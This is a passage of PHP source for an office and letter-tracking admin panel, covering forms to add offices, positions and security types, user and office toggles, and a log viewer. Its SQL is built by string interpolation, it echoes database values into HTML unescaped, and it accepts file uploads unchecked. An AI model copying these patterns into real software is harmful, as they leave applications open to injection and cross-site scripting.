						$addedtooffice = mysqli_query($con,"insert into office values(0,'$name','$parent','$locat','$desc','enabled','$code','$poslim','$email','$date')");
						if(!$addedtooffice) {
							msg("err","Something went wrong! Please report this error");
							logthis($con,$user,"0 error","failed adding office to table -office",$office);
						}
						else {
							$minuteadded = mysqli_query($con,"insert into minutes values(0,'$minnum','$min','office','$name','$date')");
							if($minuteadded) {
								msg("succ","Successfull");
								logthis($con,$user,"new office added","$name","$office");
							} else {
								msg("err","Something went wrong! Please notify admins this error");
								logthis($con,$user,"0 error","failed adding office minute to table -minutes",$office);
							}
						}
					} else msg("err","Office already exists!");
				} else msg("err","Invalid Parent! There is no office with that name");
			} else msg("err","Please input all required fileds!");
			} else {
				msg("err","Minute is Required. Please Choose or Scan!");
				logthis($con,$user,"01 error","minute uploading for office created","$office");
			}
		}
		echo '
		<div class="container">
		<div class="row text-center">
			<div class="col-md-3"></div>
            <div class="col-md-6 add-form">
              <form action="" method="POST" class="text-center" enctype="multipart/form-data">
                <h3 style="color: orange" class="text-center">Office Form</h3>
                <input type="text" class="add colr" name="dircode" placeholder="office Code">
                <input type="text" class="add colr" name="dircname" placeholder="office Name">
                <input type="email" class="add colr" name="dircem" placeholder="Office Email">
				<select name="dircpar" class="add colr">
					<option value="-1">Parent</option>
					<option>None</option>
				';
					$sql = mysqli_query($con,"select * from office");
					$num = mysqli_num_rows($sql);
					
					for($i=0;$i<$num;$i++) {
						$rows = mysqli_fetch_row($sql);
						echo "<option>".$rows[1]."</option>";
					}
				echo '
				</select>
				<input type="number" placeholder="Number of allowed Positions" name="poslim" class="add colr">
				<h5>Minute</h5>
				<input type="text" placeholder="Minute Number" name="minnum" class="add colr">
				<input type="button" onclick="easyScan(\'min\',\'office\',\''.$user.'\')" value="Scan">
				or
				<input type="file" name="minupl" >
				<div class="infdispcont"></div>
				<hr />
                <input type="text" class="add colr" name="dircloc" placeholder="Location">
                <textarea name="dircdesc" class="txt-area add colr" cols="30" rows="3" placeholder="Description"></textarea>
                <input type="submit" name="newdircsbt" class="btn btn-primary btn-sm-align" value="Create">
				<br clear="both"/>
              </form>
            </div>
		</div>
		</div>
	';
	} else if(isset($_GET["addsec"])) {
		if(isset($_POST["sectypesbt"])) {
			$secname	= sanitizeString($con,$_POST["secname"]);
			$secval		= sanitizeString($con,$_POST["secval"]);
			if($secval != "") {
			if($secname != "") {
				if(getNum($con,"sectype where name='$secname'") < 1) {
					mysqli_query($con,"insert into sectype(name,status,value) values('$secname','enabled',$secval)");
					msg("succ","Successfull");
					logthis($con,$user,"new security type added","$secname","$office");
				} else msg("err","Type Already Exists!");
			} else msg("err","Name field is empty!");
			} else msg("err","Please Enter Security value in number");
		}
		if(isset($_POST["delsectypesbt"])) {
			$sectype 	= sanitizeString($con,$_POST["sectype"]);
			if(getNum($con,"sectype where name='$sectype'") > 0){
				mysqli_query($con,"delete from sectype where name='$sectype'");
				logthis($con,$user,"security type deleted","$sectype","$office");
			}
		}
		echo "
		<div class='container'>
			<div class='row'>
				<div class='col-md-4'>
					<form action='' method='post'>
						<input type='text' name='secname' placeholder='Security Type' class='inp-sty'>
						<input type='number' name='secval' placeholder='Security Value' class='inp-sty'>
						<input type='submit' name='sectypesbt' value='Submit' class='inp-sty'>
					</form>
				</div>
				<div class='col-md-2'></div>
				<div class='col-md-5'>
		";
		if(getNum($con,"sectype") > 0) {
			echo "
				<div style='text-align: center;'>
					<form action='admin.php?addsec' method='post'>
						<input type='text' placeholder='Search' onkeyup='myajax.fetchdata(event,\'srch\',\'\')' style='display: inline-block;' name='search' class='inp-sty'>
						<input type='submit' value='Go' class='inp-sty' style='display: inline-block;width: 50px;'>
					</form>
				</div>
				<table class='table table-striped'>
					<tr>
						<td style='background: #ccc;'>Name</td>
						<td style='background: #ccc;'>Value</td>
						<td style='background: #ccc;'>Status</td>
					</tr>
			";
			if(isset($_POST["search"]))
				$srch	= sanitizeString($con,$_POST["search"]);
			else $srch	= "";
			if($srch != "")
				$inthis	= " where name like '%$srch%' || value like '%$srch%' || status like '%$srch%'";
			else $inthis = "";
			
			$sql = mysqli_query($con,"select * from sectype $inthis order by value");
			$num = mysqli_num_rows($sql);
			for($i=0;$i<$num;$i++) {
				$row = mysqli_fetch_assoc($sql);
				echo "<tr>";
				echo "	<td>".$row['name']."</td>";
				echo "	<td>".$row['value']."</td>";
				echo "	<td>".$row['status']."</td>";
				//echo "	<td><form action='' method='post'><input type='hidden' name='sectype' value='".$row['name']."'><input type='submit' name='delsectypesbt' value='Delete'></form></td>";
				echo "</tr>";
			}
			echo "
				</table>
			";
		}
		echo "
				</div>
			</div>
		</div>
		";
	} else if(isset($_GET["pwupd"])) {
		echo "
		<div class='container'>
			<div class='row'>
				<div class='col-md-4'></div>
				<div class='col-md-6'>
					<form action='' method='post'>
						<input type='text' name='oldpass' placeholder='Old Password' class='inp-sty'>
						<input type='password' name='newpass' placeholder='New Password' class='inp-sty'>
						<input type='password' name='confpass' placeholder='Confirm Password' class='inp-sty'>
						<input type='submit' name='pwupdsbt' value='Change Password' class='inp-sty btn-primary'>
					</form>
				</div>
			</div>
		</div>
		";
	} else if(isset($_GET["ends"])) {
		echo "
			<div class='container'>
				<div class='row'>
					<div class='col-md-10'>
						<div style='text-align: center;'>
							<form action='".$_SERVER["REQUEST_URI"]."' method='post'>
								<input type='text' placeholder='Search' onkeyup='myajax.fetchdata(event,\'srch\',\'\')' style='display: inline-block;' name='search' class='inp-sty'>
								<input type='submit' value='Go' class='inp-sty' style='display: inline-block;width: 50px;'>
							</form>
						</div>
						<table class='table text-center'>
							<tr>
								<td width='20%'>
									<a href='admin.php?ends&users'>Users</a>
								</td>
								<td width='20%'>
									<a href='admin.php?ends&drctr'>office</a>
								</td>
								<td width='20%'>
									<a href='admin.php?ends&typecat'>Letter Type</a>
								</td>
								<td width='20%'>
									<a href='admin.php?ends&lettercat'>Letter Category</a>
								</td>
								<td width='20%'>
									<a href='admin.php?ends&emailsuf'>Email Suffix</a>
								</td>
								<td width='20%'>
									<a href='admin.php?ends&sectype'>Security</a>
								</td>
							</tr>
						</table>
						<div class='text-center'>
							<div style='text-align: left;display: inline-block;'>
								<table class='table'>
		";
		if(isset($_POST["search"])) {
			$srch	= sanitizeString($con,$_POST["search"]);
		} else $srch = "";
		if(isset($_GET["users"])) {
			if(isset($_POST["ends"])) {
				$ends	= sanitizeString($con,$_POST["ends"]);
				$endsnm	= sanitizeString($con,$_POST["endsname"]);
				if($ends == "Disable") {
					mysqli_query($con,"update users set status='disabled' where eop='$endsnm'");
					logthis($con,$user,"user disabled","$endsnm","$office");
				} else if($ends == "Enable") {
					mysqli_query($con,"update users set status='enabled' where eop='$endsnm'");
					logthis($con,$user,"user enabled","$endsnm","$office");
				}
			}
			echo "
				<tr>
					<td>
						User
					</td>
					<td>
						Email
					</td>
					<td>
						Status
					</td>
				</tr>
			";
			if($srch != "") {
				$inthis = " where name like '%$srch%' || eop like '%$srch%' || ctime like '%$srch%' || status like '%$srch%'";
			} else $inthis = "";
			$sql = mysqli_query($con,"select * from users $inthis");
			$num = mysqli_num_rows($sql);
			for($i=0;$i<$num;$i++) {
				$rows = mysqli_fetch_assoc($sql);
				echo "
					<tr>
					<form action='' method='post'>
						<td>
							".$rows["name"]."
						</td>
						<td>
							".$rows["eop"]." \t &nbsp;
						</td>
						<td>
				";
				if($rows["status"] == "enabled") {
					echo "<input type='submit' name='ends' value='Disable'>";
				} else if($rows["status"] == "disabled") {
					echo "<input type='submit' name='ends' value='Enable'>";
				}
					echo "<input type='hidden' name='endsname' value='".$rows['eop']."'>";
				echo"
						</td>
					</form>
					</tr>
				";
			}
		} else if(isset($_GET["drctr"])) {
			if(isset($_POST["ends"])) {
				$ends	= sanitizeString($con,$_POST["ends"]);
				$endsnm	= sanitizeString($con,$_POST["endsname"]);
				if($ends == "Disable") {
					mysqli_query($con,"update office set status='disabled' where name='$endsnm'");
					logthis($con,$user,"office disabled","$endsnm","$office");
				} else if($ends == "Enable") {
					mysqli_query($con,"update office set status='enabled' where name='$endsnm'");
					logthis($con,$user,"office enabled","$endsnm","$office");
				}
			}
			echo "
				<tr>
					<td>
						office
					</td>
					<td>
						Location
					</td>
					<td>
						Status
					</td>
				</tr>
			";
			if($srch != "") {
				$inthis = " where name like '%$srch%' || location like '%$srch%' || code like '%$srch%' || info like '%$srch%' || status like '%$srch%'";
			} else $inthis = "";
			$sql = mysqli_query($con,"select * from office $inthis");
			$num = mysqli_num_rows($sql);
			for($i=0;$i<$num;$i++) {
				$rows = mysqli_fetch_assoc($sql);
				echo "
					<tr>
					<form action='' method='post'>
						<td>
							".$rows["name"]." \t &nbsp;
						</td>
						<td>
							".$rows["location"]." \t &nbsp;
						</td>
						<td>
				";
				if($rows["status"] == "enabled") {
					echo "<input type='submit' name='ends' value='Disable'>";
				} else if($rows["status"] == "disabled") {
					echo "<input type='submit' name='ends' value='Enable'>";
				}
					echo "<input type='hidden' name='endsname' value='".$rows['name']."'>";
				echo"
						</td>
						<td>
				";
				echo "
						</td>
					</form>
					</tr>
				";
			}
		} else if(isset($_GET["typecat"])) {
			if(isset($_POST["ends"])) {
				$ends	= sanitizeString($con,$_POST["ends"]);
				$endsnm	= sanitizeString($con,$_POST["endsname"]);
				if($ends == "Disable") {
					mysqli_query($con,"update typecat set status='disabled' where name='$endsnm'");
					logthis($con,$user,"letter type disabled","$endsnm","$office");
				} else if($ends == "Enable") {
					mysqli_query($con,"update typecat set status='enabled' where name='$endsnm'");
					logthis($con,$user,"letter type enabled","$endsnm","$office");
				}
			}
			echo "
				<tr>
					<td>
						Letter Type
					</td>
					<td>
						Status
					</td>
				</tr>
			";
			if($srch != "") {
				$inthis = " where name like '%$srch%' || status like '%$srch%'";
			} else $inthis = "";
			$sql = mysqli_query($con,"select * from typecat $inthis");
			$num = mysqli_num_rows($sql);
			for($i=0;$i<$num;$i++) {
				$rows = mysqli_fetch_assoc($sql);
				echo "
					<tr>
					<form action='' method='post'>
						<td>
							".$rows["name"]." \t &nbsp;
						</td>
						<td>
				";
				if($rows["status"] == "enabled") {
					echo "<input type='submit' name='ends' value='Disable'>";
				} else if($rows["status"] == "disabled") {
					echo "<input type='submit' name='ends' value='Enable'>";
				}
					echo "<input type='hidden' name='endsname' value='".$rows['name']."'>";
				echo"
						</td>
					</form>
					</tr>
				";
			}
		} else if(isset($_GET["lettercat"])) {
			if(isset($_POST["ends"])) {
				$ends	= sanitizeString($con,$_POST["ends"]);
				$endsnm	= sanitizeString($con,$_POST["endsname"]);
				if($ends == "Disable") {
					mysqli_query($con,"update lettercat set status='disabled' where name='$endsnm'");
					logthis($con,$user,"letter category disabled","$endsnm","$office");
				} else if($ends == "Enable") {
					mysqli_query($con,"update lettercat set status='enabled' where name='$endsnm'");
					logthis($con,$user,"letter category enabled","$endsnm","$office");
				}
			}
			echo "
				<tr>
					<td>
						Code
					</td>
					<td>
						Office
					</td>
					<td>
						Status
					</td>
				</tr>
			";
			if($srch != "") {
				$inthis = " where name like '%$srch%' || code like '%$srch%' || type like '%$srch%' || status like '%$srch%'";
			} else $inthis = "";
			$sql = mysqli_query($con,"select * from lettercat $inthis");
			$num = mysqli_num_rows($sql);
			for($i=0;$i<$num;$i++) {
				$rows = mysqli_fetch_assoc($sql);
				echo "
					<tr>
					<form action='' method='post'>
						<td>
							".$rows["code"]."
						</td>
						<td>
							".$rows["name"]." \t &nbsp;
						</td>
						<td>
				";
				if($rows["status"] == "enabled") {
					echo "<input type='submit' name='ends' value='Disable'>";
				} else if($rows["status"] == "disabled") {
					echo "<input type='submit' name='ends' value='Enable'>";
				}
				echo "<input type='hidden' name='endsname' value='".$rows['name']."'>";
				echo"
						</td>
					</form>
					</tr>
				";
			}
		} else if(isset($_GET["emailsuf"])) {
			if(isset($_POST["ends"])) {
				$ends	= sanitizeString($con,$_POST["ends"]);
				$endsnm	= sanitizeString($con,$_POST["endsname"]);
				if($ends == "Disable") {
					mysqli_query($con,"update emsuf set status='disabled' where name='$endsnm'");
					logthis($con,$user,"email suffix disabled","$endsnm","$office");
				} else if($ends == "Enable") {
					mysqli_query($con,"update emsuf set status='enabled' where name='$endsnm'");
					logthis($con,$user,"emamil suffix enabled","$endsnm","$office");
				} // office		position	 powerlevel
			}
			echo "
				<tr>
					<td>
						Suffix
					</td>
					<td>
						Status
					</td>
				</tr>
			";
			if($srch != "") {
				$inthis = " where name like '%$srch%' || status like '%$srch%'";
			} else $inthis = "";
			$sql = mysqli_query($con,"select * from emsuf $inthis");
			$num = mysqli_num_rows($sql);
			for($i=0;$i<$num;$i++) {
				$row = mysqli_fetch_assoc($sql);
				echo "
				<tr>
					<form action='' method='post'>
					<td>".$row['name']."</td>
					<td>
				";
				if($row["status"] == "enabled") {
					echo "<input type='submit' name='ends' value='Disable'>";
				} else if($row["status"] == "disabled") {
					echo "<input type='submit' name='ends' value='Enable'>";
				}
				echo "
					<input type='hidden' name='endsname' value='".$row['name']."'>
					</td>
					</form>
				</tr>
				";
			}
		} else if(isset($_GET["sectype"])) {
			if(isset($_POST["ends"])) {
				$ends	= sanitizeString($con,$_POST["ends"]);
				$endsnm	= sanitizeString($con,$_POST["endsname"]);
				if($ends == "Disable") {
					mysqli_query($con,"update sectype set status='disabled' where name='$endsnm'");
					logthis($con,$user,"security type disabled","$endsnm","$office");
				} else if($ends == "Enable") {
					mysqli_query($con,"update sectype set status='enabled' where name='$endsnm'");
					logthis($con,$user,"security type enabled","$endsnm","$office");
				}
			}
			echo "
				<tr>
					<td>
						Suffix
					</td>
					<td>
						Status
					</td>
				</tr>
			";
			if($srch != "") {
				$inthis = " where name like '%$srch%' || value like '%$srch%' || status like '%$srch%'";
			} else $inthis = "";
			$sql = mysqli_query($con,"select * from sectype $inthis order by value");
			$num = mysqli_num_rows($sql);
			for($i=0;$i<$num;$i++) {
				$row = mysqli_fetch_assoc($sql);
				echo "
				<tr>
					<form action='' method='post'>
					<td>".$row['name']."</td>
					<td>
				";
				if($row["status"] == "enabled") {
					echo "<input type='submit' name='ends' value='Disable'>";
				} else if($row["status"] == "disabled") {
					echo "<input type='submit' name='ends' value='Enable'>";
				}
				echo "
					<input type='hidden' name='endsname' value='".$row['name']."'>
					</td>
					</form>
				</tr>
				";
			}
		}
		echo "
								</table>
							</div>
						</div>
					</div>
				</div>
			</div>
		";
	} else if(isset($_GET["addpos"])) {
/*
		echo "
			<div class='container'>
				<div class='row'>
					<div class='col-md-4'>
						<a href='admin.php?addpos&newpos' class='btn btn-primary'>Add New Position</a>
					</div>
				</div>
			</div>
			<br />
		";
*/
		if(isset($_GET["newpos"])) {
			if(isset($_POST["possbt"])) {
				$office		= sanitizeString($con,$_POST["office"]);
				$position	= sanitizeString($con,$_POST["position"]);
				$sectype	= sanitizeString($con,$_POST["seclvll"]);
				$minnum 	= sanitizeString($con,$_POST["minnum"]);
				$min	= "";
				if(isset($_POST["min"])) {
					$min	= sanitizeString($con,$_POST["min"]);
				} else if(isset($_FILES["minupl"])) {
					$min	= "pos".time().".pdf";
					$posmin	= move_uploaded_file($_FILES["minupl"]["tmp_name"],"minutes/$min");
				}
				if($min != "" && $minnum != "") {
				if(getNum($con,"sectype where name='$sectype'") > 0) {
				if(getNum($con,"office where name='$office'") > 0) {
				if(strlen($position) >= 2 && $position != "") {
					$poslim	= mysqli_fetch_row(mysqli_query($con,"select poslim from office where name='$office'"))[0];
					if(getNum($con,"pos where office='$office'") < $poslim) {
						if(getNum($con,"pos where name='$position' && office='$office'") < 1) {
							if($posmin) {
								if(mysqli_query($con,"insert into pos values(0,'$position','$office','$sectype','enabled')")) {
									if(mysqli_query($con,"insert into minutes values(0,'$minnum','$min','pos','$position','$date')")) {
										msg("succ","Successfull");
										logthis($con,$user,"new position added","$position","admin");
									} else {
										msg("err","Error adding minute! please contact admins");
										logthis($con,$user,"0 error","inserting position minute to table minutes","admin");
									}
								} else {
									msg("err","Error adding position! please contact admins");
									logthis($con,$user,"0 error","inserting position to table pos","admin");
								}
							} else {
								msg("err","Something went wrong! Please contact admins");
								logthis($con,$user,"0 error : uploading file","minute position","admin");
							}
						} else msg("err","Position Already Exists");
					} else msg("err","Position limit reached!");
				} else msg("err","Not a valid position");
				} else msg("err","Not a valid office");
				} else msg("err","Not a valid Security Type");
				} else msg("err","Minute attachment and number is required! Please Scan or Choose.");
			}
			$secsql = mysqli_query($con,"select * from sectype where status='enabled' order by value");
			$secnum = mysqli_num_rows($secsql);
			echo "
				<script>
					var secarr = [];
			"; 
					for($i=0;$i<$secnum;$i++) {
						$secrow = mysqli_fetch_assoc($secsql);
						echo "secarr.push('".$secrow['name']."');";
					}
			echo"
				</script>
			";
			echo '
			<div class="container">
				<div class="row">
					<div class="col-md-4">
						<br />
						<form action="" method="post" enctype="multipart/form-data" autocomplete="off">
							<select name="office" class="inp-sty" tabindex=1>
								<option value="-1">Select Office</option>
			';
			$osql = mysqli_query($con,"select * from office");
				$onum = mysqli_num_rows($osql);
				for($i=0;$i<$onum;$i++) {
					$row = mysqli_fetch_assoc($osql);
					echo "		<option>".$row['name']."</option>";
				}
			echo '
							</select>
							<input type="text" name="position" placeholder="Select or Add Position" class="inp-sty" tabindex=2 id="posinp" onkeyup="myajax.fetchdata(event,\'poss\',\'posdisp\')" onclick="myajax.fetchdata(event,\'pos\',\'posdisp\')">
							<div id="posdisp" class="srchdisp"></div>
							Security Type = <input type="text" name="seclvll" id="seclvll" value="'.$secrow['name'].'" readonly /><br />
			';
			
			echo '
							<input type="range" min=1 max='.$secnum.' step=1 value="3" class="inp-sty" onchange="seclvl(event,\'seclvll\')" tabindex=3>
			';
			echo '
							<h5>Minute</h5>
							<input type="text" placeholder="Minute Number" name="minnum" class="inp-sty">
							<input type="button" onclick="easyScan(\'min\',\'pos\',\''.$user.'\')" value="Scan">
							or
							<input type="file" name="minupl">
							<div class="infdispcont"></div>
							<br />
							<br />
							<input type="submit" name="possbt" value="Add" class="inp-sty" tabindex=4>
						</form>
					</div>
					';
					if(isset($_POST["search"])) {
						$srch	= sanitizeString($con,$_POST["search"]);
					} else $srch	= "";
					if($srch != "")
						$inthis	= " where (name like '%$srch%' || office like '%$srch%' || seclevel like '%$srch%' || status like '%$srch%') ";
					else $inthis	= "";
					$sql = mysqli_query($con,"select * from pos $inthis");
					$num = mysqli_num_rows($sql);
			echo '
					<div class="col-md-2"></div>
					<div class="col-md-5">
			';
			echo "
					<form action='admin.php?addpos&newpos' method='post'>
						<input type='text' placeholder='Search' onkeyup='myajax.fetchdata(event,\'srch\',\'\')' style='display: inline-block;' name='search' class='inp-sty'>
						<input type='submit' value='Go' class='inp-sty' style='display: inline-block;width: 50px;'>
					</form>
			";
			if($num > 0) {
				if(isset($_GET["edit"])) {
					$office	= sanitizeString($con,$_GET["office"]);
					$pos	= sanitizeString($con,$_GET["pos"]);
					if(getNum($con,"pos where name='$pos'") > 0) {
						echo "<h3>Edit $office</h3>";
						echo "<table>";
						echo "	<tr>";
						echo "		<td><input type='text' name='posname' id='posname' class='inp-sty' placeholder='Position' value='$pos' disabled></td>";
						echo "		<td><input type='button' value='Edit' class='inp-sty c' onclick='myedit(\"posname\")'></td>";
						echo "	</tr>";
						echo "	<tr>";
						echo "		<td>";
						$secsql	= mysqli_query($con,"select * from sectype order by value");
						$secnum	= mysqli_num_rows($secsql);
						echo "			<select name='sec' id='sec' class='inp-sty' disabled>";
							for($i=0;$i<$secnum;$i++) {
								$rows = mysqli_fetch_assoc($secsql);
								echo "<option>".$rows['name']."</option>";
							}
						echo "			</select>";
						echo "		</td>";
						echo "		<td><input type='button' value='Edit' class='inp-sty c' onclick='myedit(\"sec\")'></td>";
						echo "	</tr>";
						echo "</table>";
					} else echo "Not Valid $office $pos";
				}
				echo '
						<table class="table table-striped">
							<tr>
								<td style="background: #ccc;">No</td>
								<td style="background: #ccc;">Office</td>
								<td style="background: #ccc;">Position</td>
								<td style="background: #ccc;">Security</td>
								<td style="background: #ccc;">Minute</td>
							</tr>
				';
						for($i=0;$i<$num;$i++) {
							$rows = mysqli_fetch_assoc($sql);
							echo "<tr>";
							echo "<td>". (int)($i+1) ."</td>";
							echo "<td>".$rows['office']."</td>";	
							echo "<td>".$rows['name']."</td>";	
							echo "<td>".$rows['seclevel']."</td>";	
							//echo "<td><a href='admin.php?addpos&newpos&edit&office=".$rows['office']."&pos=".$rows['name']."'>Edit</a></td>";	
							$posmin	= mysqli_fetch_row(mysqli_query($con,"select loc from minutes where type='pos' && name='".$rows['name']."'"))[0];
							echo "<td><a target='_blank' href='admin.php?eop=".$user."&fileview=minutes/$posmin'>View</a></td>";
							echo "</tr>";
						}
				echo '
							</table>
						';
			} else echo "No Results";
		echo '
					</div>
				</div>
			</div>
			<div>
			';
		}
	} else if(isset($_GET["viewusrs"])) {
		if(isset($_POST["usrsrch"]))
			$srch = sanitizeString($con,$_POST["usrsrch"]);
		else $srch = "";
		
		if($srch != "") {
			$inthis = " where name like '%$srch%' || eop like '%$srch%' || status like '%$srch%' || usrid like '%$srch%' ";
		} else $inthis = "";
		
		$usrssql	= mysqli_query($con,"select * from users $inthis");
		$usrsnum	= mysqli_num_rows($usrssql);
		echo "<div class='container'>";
		echo "<div class='row'>";
			if(isset($_POST["changesbt"])) {
				if(isset($_POST["email"])) {
					$email	= sanitizeString($con,$_POST["email"]);
					if(isset($_POST["usrname"])) {
						$name	= sanitizeString($con,$_POST["usrname"]);
						if($name!="") {
							mysqli_query($con,"update users set name='$name' where eop='$email'");
							msg("succ","Successfull");
							logthis($con,$user,"user edited","$email","admin");
						} else msg("err","Field is empty");
					} else if(isset($_POST["office"])) {
						$office	= sanitizeString($con,$_POST["office"]);
						if(getNum($con,"office where name='$office'") > 0) {
							$sql = mysqli_query($con,"select * from dtsmembers where eop='$email'");
							$row = mysqli_fetch_assoc($sql);
							if($row["dtsname"] != $office) {
								mysqli_query($con,"update dtsmembers set dtsname='$office',status='notapproved',approver='',emailsend=0 where eop='$email'");
								msg("succ","Successfull");
								logthis($con,$user,"office edited","$email","admin");
							} else msg("err","User is already in that office");
						} else msg("err","Office Not Found, Please select from the options");
					}
				} else msg("err","Email Not Found");
			}
			echo "
				<div class='container'>
				<div class='row'>
				<div class='col-md-3'></div>
				<div class='col-md-6'>
					<form action='admin.php?viewusrs' method='post' autocomplete='off'>
					<table>
						<tr>
							<td>
								<input type='hidden' name='viewusrs'>
								<input type='text' placeholder='Search by name,email,employee id,status' class='inp-sty' name='usrsrch' id='emedtval' onkeyup='myajax.fetchdata(event,\"email\",\"emedt\")' tabindex='1'>
								<div id='emedt' class='srchdisp'></div>
							</td>
							<td>
								<input type='submit' value='Go' name='srchusrsbt' class='inp-sty' style='width: 100px;' tabindex='2'>
							</td>
						</tr>
					</table>
					</form>
			";
			if(isset($_GET["editusrsbt"])) {
				$email	= sanitizeString($con,$_GET["email"]);
				if($email != "") {
					$offsql	= mysqli_query($con,"select * from dtsmembers where eop='$email'");
					$offrow	= mysqli_fetch_assoc($offsql);
					$usrsql	= mysqli_query($con,"select * from users where eop='$email'");
					$usrrow	= mysqli_fetch_assoc($usrsql);
					echo "<h3>$email</h3>";
					echo "<form action='' method='post'>";
					echo "<input type='hidden' name='email' value='$email'>";
					echo "<input type='hidden' name='editusrsbt'>";
					echo "<table>";
					echo "<tr>";
					echo "	<td>";
					echo "		Name : ";
					echo "	</td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "		<input type='text' id='usrname' value='".$usrrow['name']."' class='inp-sty' disabled>";
					echo "	</td>";
					echo "	<td><input type='Button' value='Edit' class='inp-sty c' onclick='myedit(\"usrname\")'></td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "		Office : ";
					echo "	</td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "	<select name='office' id='office' class='inp-sty' disabled>";
					echo "		<option>".$offrow['dtsname']."</option>";
					$sql = mysqli_query($con,"select * from office where name!='".$offrow['dtsname']."'");
					$num = mysqli_num_rows($sql);
					
					for($i=0;$i<$num;$i++) {
						$rows = mysqli_fetch_row($sql);
						echo "	<option>".$rows[1]."</option>";
					}
					echo "	</select>";
					echo "	</td>";
					echo "	<td><input type='Button' value='Edit' class='inp-sty c' onclick='myedit(\"office\")'></td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "		Position : ";
					echo "	</td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "	<select name='position' id='usrpos' class='inp-sty' disabled>";
					$sql = mysqli_query($con,"select * from pos where office='".$offrow['dtsname']."'");
					$num = mysqli_num_rows($sql);
					
					for($i=0;$i<$num;$i++) {
						$rows = mysqli_fetch_assoc($sql);
						$attr = "";
						if($offrow['position'] == $rows['name']) $attr="selected";
						echo "	<option $attr>".$rows['name']."</option>";
					}
					echo "	</select>";
					echo "	</td>";
					echo "	<td><input type='Button' value='Edit' class='inp-sty c' onclick='myedit(\"usrpos\")'></td>";
					echo "</tr>";
					echo "</table>";
					echo "</form>";
				} else msg("err","Please Input A Valid Email");
			}
			echo "
				</div>
				</div>
				</div>
				</div>
			";
		echo "<table class='table table-striped'>";
		echo "	<tr>
				<td>Full Name</td>
				<td>Email</td>
				<td>Office</td>
				<td>Position</td>
				<td>Status</td>
				<td>Action</td>
				</tr>";
		for($i=0;$i<$usrsnum;$i++) {
			$row	= mysqli_fetch_assoc($usrssql);
			$dtssql	= mysqli_query($con,"select * from dtsmembers where eop='".$row["eop"]."'");
			$dtsrow	= mysqli_fetch_assoc($dtssql);
			echo "<tr>";
			echo "<td>".$row["name"]."</td>";
			echo "<td>".$row["eop"]."</td>";
			echo "<td>".$dtsrow["dtsname"]."</td>";
			echo "<td>".$dtsrow["position"]."</td>";
			echo "<td>".$row["status"]."</td>";
			echo "<td><a href='admin.php?viewusrs&editusrsbt&email=".$row["eop"]."'>Edit</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		echo "</div>";
		echo "</div>";
	} else if(isset($_GET["viewlog"])) {
		if(isset($_POST["search"]))
			$srch	= sanitizeString($con,$_POST["search"]);
		else $srch	= "";
		if($srch != "")
			$inthis	= "where user like '%%$srch%' || name like '%%$srch%' || action like '%%$srch%' || target like '%%$srch%' || account like '%%$srch%' || date like '%%$srch%' || time like '%%$srch%'";
		else $inthis	= "";
		
		echo "
			<div class='container'>
			<div class='row'>
			<div class='col-md-12'>
				<form action='admin.php?viewlog' method='post' autocomplete='off'>
				<table>
					<tr>
						<td>
							<input type='text' placeholder='Search ' class='inp-sty' name='search' id='emedtval' onkeyup='myajax.fetchdata(event,\"email\",\"emedt\")' tabindex='1'>
							<div id='emedt' class='srchdisp'></div>
						</td>
						<td>
							<input type='submit' value='Go' name='srchusrsbt' class='inp-sty' style='width: 100px;' tabindex='2'>
						</td>
					</tr>
				</table>
				</form>
		";
			echo "<textarea class='inp-sty log' readonly>";
			$logsql	= mysqli_query($con,"select * from log $inthis order by id desc limit 200");
			$num	= mysqli_num_rows($logsql);
			if($num > 0) {
				for($i=0;$i<$num;$i++) {
					$rows	= mysqli_fetch_assoc($logsql);
					echo "/".$rows["account"]." [".$rows["date"]."][".$rows["time"]."]: ".$rows["action"]." => ".$rows["target"]." ; by ".$rows["name"]." (".$rows["user"]."). \n\n";
				}
			} else echo "None";
			echo "</textarea>";
		echo "
			</div>
			</div>
			</div>
		";
	} else if(isset($_GET["edit"])) {
		if(isset($_GET["office"])) {
			echo "Office";
		} else if(isset($_GET["user"])) {
			if(isset($_POST["changesbt"])) {
				if(isset($_POST["email"])) {
					$email	= sanitizeString($con,$_POST["email"]);
					if(isset($_POST["usrname"])) {
						$name	= sanitizeString($con,$_POST["usrname"]);
						if($name!="") {
							mysqli_query($con,"update users set name='$name' where eop='$email'");
							msg("succ","Successfull");
							logthis($con,$user,"user edited","$name","admin");
						} else msg("err","Field is empty");
					} else if(isset($_POST["office"])) {
						$office	= sanitizeString($con,$_POST["office"]);
						if(getNum($con,"office where name='$office'") > 0) {
							$sql = mysqli_query($con,"select * from dtsmembers where eop='$email'");
							$row = mysqli_fetch_assoc($sql);
							if($row["dtsname"] != $office) {
								mysqli_query($con,"update dtsmembers set dtsname='$office',status='notapproved',approver='',emailsend=0 where eop='$email'");
								msg("succ","Successfull");
								logthis($con,$user,"office edited","$office","admin");
							} else msg("err","User is already in that office");
						} else msg("err","Office Not Found, Please select from the options");
					}
				} else msg("err","Email Not Found");
			}
			echo "
				<div class='container'>
				<div class='row'>
				<div class='col-md-3'></div>
				<div class='col-md-6'>
					<form action='admin.php?edit&user' method='post' autocomplete='off'>
					<table>
						<tr>
							<td>
								<input type='text' placeholder='Search Email' class='inp-sty' name='email' id='emedtval' onkeyup='myajax.fetchdata(event,\"email\",\"emedt\")' tabindex='1'>
								<div id='emedt' class='srchdisp'></div>
							</td>
							<td>
								<input type='submit' value='Edit' name='editusrsbt' class='inp-sty' style='width: 100px;' tabindex='2'>
							</td>
						</tr>
					</table>
					</form>
			";
			if(isset($_POST["editusrsbt"])) {
				$email	= sanitizeString($con,$_POST["email"]);
				if($email != "") {
					$offsql	= mysqli_query($con,"select * from dtsmembers where eop='$email'");
					$offrow	= mysqli_fetch_assoc($offsql);
					$usrsql	= mysqli_query($con,"select * from users where eop='$email'");
					$usrrow	= mysqli_fetch_assoc($usrsql);
					echo "<h3>$email</h3>";
					echo "<form action='' method='post'>";
					echo "<input type='hidden' name='email' value='$email'>";
					echo "<input type='hidden' name='editusrsbt'>";
					echo "<table>";
					echo "<tr>";
					echo "	<td>";
					echo "		Name : ";
					echo "	</td>";
					echo "</tr>";
					echo "<tr>";
					echo "	<td>";
					echo "		<input type='text' id='usrname' value='".$usrrow['name']."' class='inp-sty' disabled>";
					echo "	</td>";
